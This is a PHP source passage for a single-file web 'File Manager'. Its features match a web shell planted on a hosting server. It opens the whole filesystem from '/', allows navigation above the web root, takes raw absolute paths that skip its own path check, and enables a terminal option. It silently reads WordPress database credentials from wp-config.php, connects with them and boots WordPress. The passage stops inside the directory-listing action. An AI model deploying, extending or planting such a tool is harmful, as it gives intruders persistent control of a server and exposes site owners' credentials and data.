<?php
$CONFIG = [
    'version'        => '3.0',
    'app_title'      => 'File Manager',
    'lang'           => 'en',
    'theme'          => 'dark',
    'show_hidden'    => false,
    'date_format'    => 'd M Y, H:i',
    'timezone'       => 'Asia/Jakarta',
    'max_upload_mb'  => 500,
    'chunk_size_mb'  => 2,
    'allow_terminal' => true,
    'allow_above_root' => true,    
    'error_reporting'=> false,
    'online_viewer'  => 'google', 
];


$root_path = '/';
$initial_path = $_SERVER['DOCUMENT_ROOT'];
$auth_users = [
    'admin' => '$2y$10$4WvpD9fo3xq2PRlMvP4aC.j4.lpV1EytvtbF/ZoJzu.kXzDkIgyB.', 
    'user'  => '$2y$10$Fg6Dz8oH9fPoZ2jJan5tZuv6Z4Kp7avtQ9bDfrdRntXtPeiMAZyGO',   
];
$readonly_users = ['user'];


$user_dirs = [];


$ext_cfg = __DIR__ . '/filepro-config.php';
if (is_readable($ext_cfg)) { @include $ext_cfg; }


define('FM_VERSION',    $CONFIG['version']);
define('FM_TITLE',      $CONFIG['app_title']);
define('FM_SESSION',    'filepro_session');
define('FM_ROOT',       rtrim(str_replace('\\','/',$root_path ?? __DIR__), '/') ?: '/');
define('FM_SELF',       basename($_SERVER['PHP_SELF'] ?? __FILE__));
define('FM_SELF_URL',   ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http')
                         . '://' . ($_SERVER['HTTP_HOST'] ?? 'localhost') . ($_SERVER['PHP_SELF'] ?? '/'));
define('FM_IS_WIN', DIRECTORY_SEPARATOR === '\\');


if ($CONFIG['error_reporting']) {
    error_reporting(E_ALL);
    ini_set('display_errors', '1');
} else {

    error_reporting(0);
    ini_set('display_errors', '0');
    ini_set('log_errors', '1');
}


register_shutdown_function(function() {
    $err = error_get_last();
    if (!$err || !in_array($err['type'], [E_ERROR, E_CORE_ERROR, E_COMPILE_ERROR, E_PARSE, E_USER_ERROR])) return;
    if (headers_sent()) return;
    $is_ajax = (!empty($_POST['action']) || !empty($_GET['action'])) ||
               (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest');
    http_response_code(200);
    if ($is_ajax) {
        header('Content-Type: application/json; charset=utf-8');
        echo json_encode(['ok'=>false,'msg'=>'Server fatal: '.$err['message'].' @ '.basename($err['file']).':'.$err['line']]);
    } else {
        header('Content-Type: text/html; charset=utf-8');
        echo '<!DOCTYPE html><html><body style="background:#0f1115;color:#f87171;font-family:monospace;padding:40px;line-height:1.6">';
        echo '<h2 style="color:#fbbf24">File Manager — Fatal Error</h2>';
        echo '<p style="color:#e5e7eb">'.htmlspecialchars($err['message']).'</p>';
        echo '<p style="color:#6b7280;font-size:12px">'.htmlspecialchars($err['file']).':'.$err['line'].'</p>';
        echo '<hr style="border-color:#374151;margin:20px 0">';
        echo '<p style="color:#9ca3af;font-size:13px">Possible causes:<br>';
        echo '&bull; PHP version too old (need &ge; 7.0)<br>';
        echo '&bull; A required function is disabled by your hosting<br>';
        echo '&bull; Session save path not writable<br>';
        echo '&bull; File / folder permission issues<br>';
        echo '&bull; To debug, set $CONFIG[\'error_reporting\'] = true at the top of the file</p>';
        echo '</body></html>';
    }
});

set_exception_handler(function($e) {
    if (headers_sent()) return;
    $is_ajax = (!empty($_POST['action']) || !empty($_GET['action'])) ||
               (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest');
    http_response_code(200);
    if ($is_ajax) {
        header('Content-Type: application/json; charset=utf-8');
        echo json_encode(['ok'=>false,'msg'=>'Server error: '.$e->getMessage()]);
    } else {
        header('Content-Type: text/html; charset=utf-8');
        echo '<!DOCTYPE html><html><body style="background:#0f1115;color:#f87171;font-family:monospace;padding:40px;line-height:1.6">';
        echo '<h2 style="color:#fbbf24">File Manager — Error</h2>';
        echo '<p style="color:#e5e7eb">'.htmlspecialchars($e->getMessage()).'</p>';
        echo '<p style="color:#6b7280;font-size:12px">'.htmlspecialchars($e->getFile()).':'.$e->getLine().'</p>';
        echo '</body></html>';
    }
    exit;
});

date_default_timezone_set($CONFIG['timezone'] ?? 'UTC');
@ini_set('default_charset', 'UTF-8');

@set_time_limit(600);


if (function_exists('session_status') && session_status() === PHP_SESSION_NONE) {
    @session_name(FM_SESSION);
    if (!@session_start()) {
        $tmp = sys_get_temp_dir();
        if ($tmp && is_writable($tmp)) {
            @ini_set('session.save_path', $tmp);
            @session_start();
        }
    }
}
if (!isset($_SESSION) || !is_array($_SESSION)) $_SESSION = [];

if (empty($_SESSION['_token'])) {
    if (function_exists('random_bytes')) {
        $_SESSION['_token'] = bin2hex(random_bytes(32));
    } else {
        $b = ''; for ($i=0;$i<32;$i++) $b .= chr(mt_rand(0,255));
        $_SESSION['_token'] = bin2hex($b);
    }
}


if (!function_exists('str_starts_with')) {
    function str_starts_with($haystack, $needle) {
        return $needle === '' || strpos($haystack, $needle) === 0;
    }
}
if (!function_exists('str_ends_with')) {
    function str_ends_with($haystack, $needle) {
        return $needle === '' || substr($haystack, -strlen($needle)) === $needle;
    }
}
if (!function_exists('str_contains')) {
    function str_contains($haystack, $needle) {
        return $needle === '' || strpos($haystack, $needle) !== false;
    }
}


function fm_json($data, $code = 200) {
    http_response_code($code);
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode($data, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    exit;
}

function fm_err($msg, $code = 400) {
    fm_json(['ok' => false, 'msg' => $msg], $code);
}

function fm_ok($data = null, $msg = 'OK') {
    fm_json(['ok' => true, 'msg' => $msg, 'data' => $data]);
}

function fm_verify_token() {
    $token = $_POST['_token'] ?? $_SERVER['HTTP_X_CSRF_TOKEN'] ?? '';
    if (!hash_equals($_SESSION['_token'] ?? '', $token)) {
        fm_err('Invalid CSRF token', 403);
    }
}

function fm_clean(string $p): string {
    $p = str_replace('\\', '/', $p);
    $p = preg_replace('#/+#', '/', $p);
    $isAbs = str_starts_with($p, '/');
    $parts = explode('/', $p);
    $out = [];
    foreach ($parts as $part) {
        if ($part === '' || $part === '.') continue;
        if ($part === '..') { array_pop($out); continue; }
        $out[] = $part;
    }
    $result = implode('/', $out);
    return $isAbs ? '/' . $result : $result;
}

function fm_abs(string $rel): string {
    global $CONFIG;
    $rel  = fm_clean($rel);
    // Handle absolute paths (for above-root navigation)
    if ($CONFIG['allow_above_root'] && $rel !== '' && str_starts_with($rel, '/')) {
        return $rel;
    }
    $path = rtrim(FM_ROOT, '/') . ($rel !== '' ? '/' . $rel : (FM_ROOT === '/' ? '/' : ''));
    // Security: prevent going above root unless allowed
    if (!$CONFIG['allow_above_root']) {
        $real_root = realpath(FM_ROOT);
        $real_path = realpath($path) ?: $path;
        if ($real_root && strpos($real_path, $real_root) !== 0) {
            fm_err('Access denied: outside root path', 403);
        }
    }
    return $path;
}

function fm_rel(string $abs): string {
    $abs = str_replace('\\', '/', $abs);
    $root = FM_ROOT . '/';
    if (strpos($abs, $root) === 0) {
        return substr($abs, strlen($root));
    }
    return $abs;
}

function fm_size_human($bytes): string {
    $bytes = (int)$bytes;
    $units = ['B','KB','MB','GB','TB'];
    $i = 0;
    while ($bytes >= 1024 && $i < 4) { $bytes /= 1024; $i++; }
    return round($bytes, 2) . ' ' . $units[$i];
}

function fm_mime(string $path): string {
    try {
        if (function_exists('finfo_open')) {
            $fi = @finfo_open(FILEINFO_MIME_TYPE);
            if ($fi) {
                $m = @finfo_file($fi, $path);
                @finfo_close($fi);
                return $m ?: 'application/octet-stream';
            }
        }
        $m = @mime_content_type($path);
        return $m ?: 'application/octet-stream';
    } catch (\Throwable $e) {
        return 'application/octet-stream';
    }
}

function fm_is_text(string $path): bool {
    $text_ext = ['txt','css','less','scss','sass','js','ts','jsx','tsx','mjs','cjs',
        'json','xml','html','htm','xhtml','php','py','rb','go','rs','java','kt',
        'c','cpp','h','hpp','cs','sh','bash','zsh','fish','ps1','bat','cmd',
        'yaml','yml','toml','ini','conf','config','env','htaccess','htpasswd',
        'sql','md','mdx','markdown','log','csv','svg','vue','svelte','astro',
        'gitignore','gitattributes','dockerfile','makefile','lock','patch'];
    $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
    if (in_array($ext, $text_ext)) return true;
    $mime = fm_mime($path);
    return str_starts_with($mime, 'text/') || in_array($mime, [
        'application/json','application/xml','application/javascript',
        'application/x-javascript','image/svg+xml'
    ]);
}

function fm_is_image(string $path): bool {
    return in_array(strtolower(pathinfo($path, PATHINFO_EXTENSION)),
        ['jpg','jpeg','png','gif','webp','avif','bmp','ico','svg','tif','tiff']);
}

function fm_is_video(string $path): bool {
    return in_array(strtolower(pathinfo($path, PATHINFO_EXTENSION)),
        ['mp4','webm','ogg','ogv','mkv','avi','mov','flv','m4v','wmv']);
}

function fm_is_audio(string $path): bool {
    return in_array(strtolower(pathinfo($path, PATHINFO_EXTENSION)),
        ['mp3','wav','ogg','flac','aac','m4a','opus','wma']);
}

function fm_file_type(string $path): string {
    $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
    if (fm_is_image($path)) return 'image';
    if (fm_is_video($path)) return 'video';
    if (fm_is_audio($path)) return 'audio';
    if (fm_is_text($path))  return 'text';
    if (in_array($ext, ['zip','tar','gz','bz2','7z','rar','xz','tgz'])) return 'archive';
    if (in_array($ext, ['pdf'])) return 'pdf';
    return 'binary';
}

function fm_icon_class(string $path): string {
    $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
    if (fm_is_image($path))  return 'fa-file-image';
    if (fm_is_video($path))  return 'fa-file-video';
    if (fm_is_audio($path))  return 'fa-file-audio';
    if (in_array($ext, ['zip','tar','gz','bz2','7z','rar','xz','tgz'])) return 'fa-file-zipper';
    if (in_array($ext, ['pdf'])) return 'fa-file-pdf';
    if (in_array($ext, ['doc','docx','odt'])) return 'fa-file-word';
    if (in_array($ext, ['xls','xlsx','ods','csv'])) return 'fa-file-excel';
    if (in_array($ext, ['ppt','pptx'])) return 'fa-file-powerpoint';
    if (in_array($ext, ['php','py','js','ts','rb','go','rs','java','c','cpp','cs','sh'])) return 'fa-file-code';
    if (in_array($ext, ['html','htm','xml','svg'])) return 'fa-file-code';
    if (fm_is_text($path))   return 'fa-file-lines';
    return 'fa-file';
}

function fm_list_dir(string $path, bool $show_hidden = false): array {
    $entries = @scandir($path);
    if (!$entries) return ['folders' => [], 'files' => []];

    $folders = [];
    $files   = [];

    foreach ($entries as $name) {
        if ($name === '.' || $name === '..') continue;
        if (!$show_hidden && str_starts_with($name, '.')) continue;

        $full = $path . '/' . $name;

        // Skip known dangerous special files (devices, sockets, pipes) — they crash PHP
        $ftype = @filetype($full);
        if (in_array($ftype, ['socket', 'fifo', 'char', 'block', 'unknown'], true)) {
            continue;
        }

        try {
            $stat = @stat($full);
            $entry = [
                'name'    => $name,
                'mtime'   => is_array($stat) ? ($stat['mtime'] ?? 0) : 0,
                'is_link' => @is_link($full),
            ];

            if ($ftype === 'dir' || @is_dir($full)) {
                $entry['type'] = 'dir';
                $folders[] = $entry;
            } elseif ($ftype === 'file' || $ftype === 'link' || @is_file($full)) {
                $entry['type']  = 'file';
                $entry['size']  = is_array($stat) ? ($stat['size'] ?? 0) : 0;
                $entry['ext']   = strtolower(pathinfo($name, PATHINFO_EXTENSION));
                $entry['ftype'] = @fm_file_type($full) ?: 'binary';
                $entry['icon']  = @fm_icon_class($full) ?: 'fa-file';
                $entry['mime']  = @fm_mime($full) ?: 'application/octet-stream';
                $files[] = $entry;
            }
        } catch (\Throwable $e) {
            // Skip entries that cause any error
            continue;
        }
    }

    usort($folders, function($a, $b) { return strcasecmp($a['name'], $b['name']); });
    usort($files,   function($a, $b) { return strcasecmp($a['name'], $b['name']); });

    return ['folders' => $folders, 'files' => $files];
}

function fm_rdelete(string $path): bool {
    if (is_link($path)) return unlink($path);
    if (is_file($path)) return unlink($path);
    if (is_dir($path)) {
        foreach (scandir($path) as $f) {
            if ($f === '.' || $f === '..') continue;
            fm_rdelete($path . '/' . $f);
        }
        return rmdir($path);
    }
    return false;
}

function fm_rcopy(string $src, string $dst): bool {
    if (is_file($src)) {
        @mkdir(dirname($dst), 0755, true);
        return copy($src, $dst);
    }
    if (is_dir($src)) {
        @mkdir($dst, 0755, true);
        foreach (scandir($src) as $f) {
            if ($f === '.' || $f === '..') continue;
            if (!fm_rcopy($src.'/'.$f, $dst.'/'.$f)) return false;
        }
        return true;
    }
    return false;
}

function fm_zip_create(string $zip_file, array $files, string $base): bool {
    if (!class_exists('ZipArchive')) return false;
    $zip = new ZipArchive();
    if ($zip->open($zip_file, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) return false;
    foreach ($files as $f) {
        $full = $base . '/' . $f;
        if (is_file($full)) {
            $zip->addFile($full, $f);
        } elseif (is_dir($full)) {
            $iter = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($full, FilesystemIterator::SKIP_DOTS));
            foreach ($iter as $file) {
                $local = $f . '/' . $iter->getSubPathname();
                $zip->addFile($file->getPathname(), $local);
            }
        }
    }
    return $zip->close();
}

function fm_zip_info(string $path): array {
    $list = [];
    if (!class_exists('ZipArchive')) return $list;
    $zip = new ZipArchive();
    if ($zip->open($path) !== true) return $list;
    for ($i = 0; $i < $zip->numFiles; $i++) {
        $stat = $zip->statIndex($i);
        $list[] = [
            'name' => $stat['name'],
            'size' => $stat['size'],
            'comp' => $stat['comp_size'],
            'dir'  => str_ends_with($stat['name'], '/'),
        ];
    }
    $zip->close();
    return $list;
}

/**
 * Zip-slip safe extractor. Extracts every entry of $zip into $dest, rejecting
 * any entry whose resolved target would escape $dest (via ../, absolute paths,
 * Windows drive letters, etc.). Overwrites existing files by default.
 *
 * Fills $stats (by reference):
 *   - extracted: total files written
 *   - php:       count of *.php files written (also chmodded 0755)
 *   - overwrit:  count of entries that replaced an existing file
 *   - rejected:  count of entries skipped as unsafe
 *   - rejects:   array of rejected entry names (for logging)
 *   - files:     array of written relative paths
 */
function fm_zip_extract_safe(ZipArchive $zip, string $dest, array &$stats): bool {
    $stats = ['extracted'=>0,'php'=>0,'overwrit'=>0,'rejected'=>0,'rejects'=>[],'files'=>[]];
    $destReal = realpath($dest);
    if ($destReal === false) return false;
    $destReal = rtrim(str_replace('\\','/',$destReal), '/');

    for ($i = 0; $i < $zip->numFiles; $i++) {
        $name = $zip->getNameIndex($i);
        if ($name === false || $name === '' || str_ends_with($name, '/')) continue;

        // Normalize entry path: strip Windows drive letter, backslashes, leading slashes
        $norm = str_replace('\\', '/', $name);
        if (preg_match('#^[a-zA-Z]:#', $norm)) { $stats['rejected']++; $stats['rejects'][]=$name; continue; }
        $norm = ltrim($norm, '/');

        // Resolve without touching the filesystem (entries don't exist yet)
        $parts = [];
        foreach (explode('/', $norm) as $seg) {
            if ($seg === '' || $seg === '.') continue;
            if ($seg === '..') {
                if (empty($parts)) { $parts = null; break; }
                array_pop($parts);
            } else {
                $parts[] = $seg;
            }
        }
        if ($parts === null || empty($parts)) { $stats['rejected']++; $stats['rejects'][]=$name; continue; }
        $safeRel = implode('/', $parts);
        $target  = $destReal . '/' . $safeRel;

        // Double-check final path is within $destReal
        $targetDir = dirname($target);
        if (!is_dir($targetDir)) @mkdir($targetDir, 0755, true);
        $dirReal = realpath($targetDir);
        if ($dirReal === false || strpos(str_replace('\\','/',$dirReal), $destReal) !== 0) {
            $stats['rejected']++; $stats['rejects'][]=$name; continue;
        }

        $existed = file_exists($target);

        // Copy entry stream to target (overwrites by default)
        $in = $zip->getStream($name);
        if (!$in) { $stats['rejected']++; $stats['rejects'][]=$name; continue; }
        $out = @fopen($target, 'wb');
        if (!$out) { fclose($in); $stats['rejected']++; $stats['rejects'][]=$name; continue; }
        stream_copy_to_stream($in, $out);
        fclose($in); fclose($out);

        $isPhp = strtolower(pathinfo($safeRel, PATHINFO_EXTENSION)) === 'php';
        @chmod($target, $isPhp ? 0755 : 0644);

        $stats['extracted']++;
        if ($isPhp)   $stats['php']++;
        if ($existed) $stats['overwrit']++;
        $stats['files'][] = $safeRel;
    }
    return true;
}

/**
 * WordPress detection: walk up from $initial_path / script dir looking for
 * wp-load.php. Cached in FM_WP_ROOT constant (string path or null).
 */
function fm_wp_detect(): ?string {
    static $cached = false;
    static $result = null;
    if ($cached) return $result;
    $cached = true;
    $starts = [];
    if (isset($GLOBALS['initial_path'])) $starts[] = $GLOBALS['initial_path'];
    $starts[] = __DIR__;
    $starts[] = $_SERVER['DOCUMENT_ROOT'] ?? '';
    foreach ($starts as $dir) {
        if (!$dir) continue;
        $dir = rtrim(str_replace('\\','/',$dir), '/');
        for ($i = 0; $i < 6; $i++) {
            if ($dir === '' || $dir === '/') break;
            if (is_file($dir . '/wp-load.php')) { $result = $dir; return $result; }
            $parent = dirname($dir);
            if ($parent === $dir) break;
            $dir = $parent;
        }
    }
    return null;
}

/**
 * Lazy WP bootstrap: loads wp-load.php exactly once, swallows its output,
 * and returns true on success / false if WP isn't reachable or crashed.
 * After success, $wpdb, wp_*() functions, ABSPATH, etc. are available.
 */
function fm_wp_bootstrap(): bool {
    static $loaded = null;
    if ($loaded !== null) return $loaded;
    $root = fm_wp_detect();
    if (!$root) return $loaded = false;
    if (!defined('WP_USE_THEMES')) define('WP_USE_THEMES', false);
    // Prevent WP from auto-redirecting during our AJAX
    if (!defined('DOING_AJAX'))    define('DOING_AJAX', true);
    ob_start();
    try {
        /** @noinspection PhpIncludeInspection */
        require_once $root . '/wp-load.php';
        $loaded = function_exists('wp_get_current_user');
    } catch (\Throwable $e) {
        $loaded = false;
    }
    ob_end_clean();
    return $loaded;
}

function fm_db_detect(): ?array {
    static $cached = null;
    if ($cached !== null) return $cached ?: null;
    $starts = [];
    if (isset($GLOBALS['initial_path'])) $starts[] = $GLOBALS['initial_path'];
    $starts[] = __DIR__;
    $starts[] = $_SERVER['DOCUMENT_ROOT'] ?? '';
    foreach ($starts as $dir) {
        if (!$dir) continue;
        $dir = rtrim(str_replace('\\', '/', $dir), '/');
        for ($i = 0; $i < 6; $i++) {
            if ($dir === '' || $dir === '/') break;
            $cfg = $dir . '/wp-config.php';
            if (is_file($cfg)) {
                $src = @file_get_contents($cfg);
                if ($src) {
                    $creds = [];
                    foreach (['DB_NAME', 'DB_USER', 'DB_PASSWORD', 'DB_HOST', 'DB_CHARSET'] as $c) {
                        if (preg_match("/define\s*\(\s*['\"]" . $c . "['\"]\s*,\s*['\"]([^'\"]*?)['\"]\s*\)/", $src, $m)) {
                            $creds[$c] = $m[1];
                        }
                    }
                    if (!empty($creds['DB_NAME']) && !empty($creds['DB_USER'])) {
                        $cached = $creds;
                        return $cached;
                    }
                }
            }
            $parent = dirname($dir);
            if ($parent === $dir) break;
            $dir = $parent;
        }
    }
    $cached = false;
    return null;
}

function fm_db_connect(): ?mysqli {
    static $conn = null;
    if ($conn !== null) return $conn;
    $creds = fm_db_detect();
    if (!$creds) return null;
    $host = $creds['DB_HOST'] ?? 'localhost';
    $port = 3306;
    $socket = '';
    if (strpos($host, ':') !== false) {
        $parts = explode(':', $host, 2);
        $host = $parts[0];
        if (is_numeric($parts[1])) $port = (int)$parts[1];
        else $socket = $parts[1];
    }
    try {
        $conn = @new mysqli($host, $creds['DB_USER'] ?? '', $creds['DB_PASSWORD'] ?? '', $creds['DB_NAME'] ?? '', $port, $socket);
        if ($conn->connect_error) { $conn = null; return null; }
        $charset = $creds['DB_CHARSET'] ?? 'utf8mb4';
        $conn->set_charset($charset);
    } catch (\Throwable $e) {
        $conn = null;
    }
    return $conn;
}

function fm_perms(string $path): string {
    $p = @fileperms($path);
    if ($p === false) return '0000';
    return substr(decoct($p), -4);
}

function fm_owner(string $path): string {
    if (!function_exists('posix_getpwuid')) return '?';
    try {
        $uid = @fileowner($path);
        $gid = @filegroup($path);
        if ($uid === false || $gid === false) return '?';
        $u = @posix_getpwuid($uid);
        $g = @posix_getgrgid($gid);
        return ($u['name'] ?? $uid) . ':' . ($g['name'] ?? $gid);
    } catch (\Throwable $e) { return '?'; }
}

// Auth
function fm_is_logged(): bool {
    global $auth_users;
    if (empty($auth_users)) return true;
    return isset($_SESSION[FM_SESSION]['user'], $auth_users[$_SESSION[FM_SESSION]['user']]);
}

function fm_is_readonly(): bool {
    global $readonly_users;
    $user = $_SESSION[FM_SESSION]['user'] ?? '';
    return !empty($readonly_users) && in_array($user, $readonly_users);
}

function fm_login(string $user, string $pass): bool {
    global $auth_users;
    if (!isset($auth_users[$user])) return false;
    return password_verify($pass, $auth_users[$user]);
}

// Translation
function t(string $key): string {
    global $CONFIG;
    static $tr = null;
    if ($tr === null) $tr = fm_translations();
    $lang = $CONFIG['lang'];
    return $tr[$lang][$key] ?? $tr['en'][$key] ?? $key;
}

function fm_translations(): array {
    return [
        'en' => [
            'login'         => 'Sign In',
            'logout'        => 'Sign Out',
            'username'      => 'Username',
            'password'      => 'Password',
            'login_failed'  => 'Invalid username or password',
            'new_folder'    => 'New Folder',
            'new_file'      => 'New File',
            'upload'        => 'Upload',
            'download'      => 'Download',
            'delete'        => 'Delete',
            'rename'        => 'Rename',
            'copy'          => 'Copy',
            'move'          => 'Move',
            'edit'          => 'Edit',
            'view'          => 'View',
            'save'          => 'Save',
            'cancel'        => 'Cancel',
            'close'         => 'Close',
            'confirm'       => 'Confirm',
            'search'        => 'Search',
            'settings'      => 'Settings',
            'terminal'      => 'Terminal',
            'permissions'   => 'Permissions',
            'compress'      => 'Compress',
            'extract'       => 'Extract',
            'select_all'    => 'Select All',
            'deselect_all'  => 'Deselect All',
            'name'          => 'Name',
            'size'          => 'Size',
            'modified'      => 'Modified',
            'type'          => 'Type',
            'actions'       => 'Actions',
            'owner'         => 'Owner',
            'perms'         => 'Permissions',
            'empty_folder'  => 'This folder is empty',
            'files'         => 'files',
            'folders'       => 'folders',
            'total_size'    => 'Total size',
            'confirm_del'   => 'Delete selected items?',
            'confirm_del1'  => 'Delete',
            'readonly_msg'  => 'Read-only mode',
            'home'          => 'Home',
            'back'          => 'Back',
            'refresh'       => 'Refresh',
            'path'          => 'Path',
            'enter_name'    => 'Enter name...',
            'enter_cmd'     => 'Enter command...',
            'dark_mode'     => 'Dark Mode',
            'light_mode'    => 'Light Mode',
            'grid_view'     => 'Grid View',
            'list_view'     => 'List View',
            'copy_link'     => 'Copy Link',
            'properties'    => 'Properties',
            'open'          => 'Open',
            'preview'       => 'Preview',
            'zip_selected'  => 'ZIP Selected',
            'move_to'       => 'Move to...',
            'copy_to'       => 'Copy to...',
            'destination'   => 'Destination path',
            'select_items'  => 'Select items first',
            'zip_name'      => 'Archive name',
            'extract_here'  => 'Extract Here',
            'extract_folder'=> 'Extract to Folder',
            'change_perms'  => 'Change Permissions',
            'new_item'      => 'New Item',
            'hash_gen'      => 'Password Hash Generator',
            'pwd_input'     => 'Enter password',
            'generate'      => 'Generate',
            'theme'         => 'Theme',
            'language'      => 'Language',
            'show_hidden'   => 'Show hidden files',
            'date_format'   => 'Date format',
            'about'         => 'About',
            'ver'           => 'Version',
            'error'         => 'Error',
            'success'       => 'Success',
            'copied'        => 'Copied!',
            'saved'         => 'Saved!',
            'deleted'       => 'Deleted!',
            'renamed'       => 'Renamed!',
            'uploaded'      => 'Upload complete!',
            'not_found'     => 'File not found',
            'access_denied' => 'Access denied',
            'readonly_warn' => 'You are in read-only mode',
            'drag_drop'     => 'Drag & drop files here, or click to select',
            'uploading'     => 'Uploading...',
            'processing'    => 'Processing...',
            'no_results'    => 'No results found',
            'arch_info'     => 'Archive Info',
            'img_size'      => 'Dimensions',
            'mime'          => 'MIME Type',
            'created'       => 'Created',
            'file_size'     => 'File Size',
            'copy_path'     => 'Copy Path',
            'duplicate'     => 'Duplicate',
        ],
        'id' => [
            'login'         => 'Masuk',
            'logout'        => 'Keluar',
            'username'      => 'Nama Pengguna',
            'password'      => 'Kata Sandi',
            'login_failed'  => 'Nama pengguna atau kata sandi salah',
            'new_folder'    => 'Folder Baru',
            'new_file'      => 'File Baru',
            'upload'        => 'Unggah',
            'download'      => 'Unduh',
            'delete'        => 'Hapus',
            'rename'        => 'Ganti Nama',
            'copy'          => 'Salin',
            'move'          => 'Pindah',
            'edit'          => 'Edit',
            'view'          => 'Lihat',
            'save'          => 'Simpan',
            'cancel'        => 'Batal',
            'close'         => 'Tutup',
            'confirm'       => 'Konfirmasi',
            'search'        => 'Cari',
            'settings'      => 'Pengaturan',
            'terminal'      => 'Terminal',
            'permissions'   => 'Izin',
            'compress'      => 'Kompres',
            'extract'       => 'Ekstrak',
            'select_all'    => 'Pilih Semua',
            'deselect_all'  => 'Batalkan Pilihan',
            'name'          => 'Nama',
            'size'          => 'Ukuran',
            'modified'      => 'Dimodifikasi',
            'type'          => 'Tipe',
            'actions'       => 'Aksi',
            'owner'         => 'Pemilik',
            'perms'         => 'Izin',
            'empty_folder'  => 'Folder ini kosong',
            'files'         => 'file',
            'folders'       => 'folder',
            'total_size'    => 'Total ukuran',
            'confirm_del'   => 'Hapus item yang dipilih?',
            'confirm_del1'  => 'Hapus',
            'readonly_msg'  => 'Mode baca saja',
            'home'          => 'Beranda',
            'back'          => 'Kembali',
            'refresh'       => 'Segarkan',
            'path'          => 'Jalur',
            'enter_name'    => 'Masukkan nama...',
            'enter_cmd'     => 'Masukkan perintah...',
            'dark_mode'     => 'Mode Gelap',
            'light_mode'    => 'Mode Terang',
            'grid_view'     => 'Tampilan Grid',
            'list_view'     => 'Tampilan List',
            'copy_link'     => 'Salin Tautan',
            'properties'    => 'Properti',
            'open'          => 'Buka',
            'preview'       => 'Pratinjau',
            'zip_selected'  => 'ZIP Terpilih',
            'move_to'       => 'Pindah ke...',
            'copy_to'       => 'Salin ke...',
            'destination'   => 'Jalur tujuan',
            'select_items'  => 'Pilih item terlebih dahulu',
            'zip_name'      => 'Nama arsip',
            'extract_here'  => 'Ekstrak Di Sini',
            'extract_folder'=> 'Ekstrak ke Folder',
            'change_perms'  => 'Ubah Izin',
            'new_item'      => 'Item Baru',
            'hash_gen'      => 'Generator Hash Kata Sandi',
            'pwd_input'     => 'Masukkan kata sandi',
            'generate'      => 'Buat',
            'theme'         => 'Tema',
            'language'      => 'Bahasa',
            'show_hidden'   => 'Tampilkan file tersembunyi',
            'date_format'   => 'Format tanggal',
            'about'         => 'Tentang',
            'ver'           => 'Versi',
            'error'         => 'Kesalahan',
            'success'       => 'Berhasil',
            'copied'        => 'Disalin!',
            'saved'         => 'Disimpan!',
            'deleted'       => 'Dihapus!',
            'renamed'       => 'Nama diubah!',
            'uploaded'      => 'Unggahan selesai!',
            'not_found'     => 'File tidak ditemukan',
            'access_denied' => 'Akses ditolak',
            'readonly_warn' => 'Anda dalam mode baca saja',
            'drag_drop'     => 'Seret & lepas file di sini, atau klik untuk memilih',
            'uploading'     => 'Mengunggah...',
            'processing'    => 'Memproses...',
            'no_results'    => 'Tidak ada hasil',
            'arch_info'     => 'Info Arsip',
            'img_size'      => 'Dimensi',
            'mime'          => 'Tipe MIME',
            'created'       => 'Dibuat',
            'file_size'     => 'Ukuran File',
            'copy_path'     => 'Salin Jalur',
            'duplicate'     => 'Duplikat',
        ],
    ];
}

// ─────────────────────────────────────────────
// AJAX ACTION ROUTER
// ─────────────────────────────────────────────
if (isset($_POST['action']) || isset($_GET['action'])) {
    $action = $_POST['action'] ?? $_GET['action'] ?? '';

    // Public actions (no auth needed)
    if ($action === 'login') {
        $u = trim($_POST['username'] ?? '');
        $p = $_POST['password'] ?? '';
        if (fm_login($u, $p)) {
            global $user_dirs;
            $_SESSION[FM_SESSION]['user'] = $u;
            if (!empty($user_dirs[$u])) {
                $_SESSION[FM_SESSION]['root'] = fm_clean($user_dirs[$u]);
            }
            fm_ok(['user' => $u, 'token' => $_SESSION['_token']]);
        }
        fm_err(t('login_failed'), 401);
    }

    if ($action === 'logout') {
        session_destroy();
        fm_ok();
    }

    // Auth wall
    global $auth_users;
    if (!empty($auth_users) && !fm_is_logged()) {
        fm_err(t('access_denied'), 401);
    }

    $rel_path = fm_clean($_POST['path'] ?? $_GET['path'] ?? '');

    // Override root per user
    if (isset($_SESSION[FM_SESSION]['root'])) {
        define('FM_CWD_ROOT', FM_ROOT . '/' . $_SESSION[FM_SESSION]['root']);
    } else {
        define('FM_CWD_ROOT', FM_ROOT);
    }

    switch ($action) {

        // ── LIST ──────────────────────────────────
        case 'list':
            // Support absolute path navigation (breadcrumb clicks)
            $abs_direct = $_POST['abs_path'] ?? $_GET['abs_path'] ?? '';
            if ($abs_direct !== '') {
                $abs = str_replace('\\', '/', $abs_direct);
            } else {
                $abs = fm_abs($rel_path);
            }
            if (!is_dir($abs)) fm_err('Not a directory', 404);
            // Admin always sees hidden files; readonly user never sees hidden files
            $effective_show_hidden = fm_is_readonly() ? false : true;
            $data = fm_list_dir($abs, $effective_show_hidden);
            // Readonly users only see folders, no files
            if (fm_is_readonly()) {
                $data['files'] = [];
            }
            // Append formatted dates
            $fmt = $CONFIG['date_format'];
            foreach (['folders','files'] as $group) {
                foreach ($data[$group] as &$e) {
                    $e['mtime_fmt'] = date($fmt, $e['mtime']);
                    $e['size_fmt']  = isset($e['size']) ? fm_size_human($e['size']) : '';
                    if (!FM_IS_WIN) {
                        $fp = $abs . '/' . $e['name'];
                        try {
                            $e['perms'] = @fm_perms($fp) ?: '0000';
                            $e['owner'] = @fm_owner($fp) ?: '?';
                        } catch (\Throwable $_e) {
                            $e['perms'] = '0000';
                            $e['owner'] = '?';
                        }
                    }
                }
            }
            // Include absolute path so frontend can show full server path
            $real = realpath($abs) ?: $abs;
            $data['abs_path'] = str_replace('\\', '/', $real);
            $data['root_path'] = FM_ROOT;
            fm_ok($data);

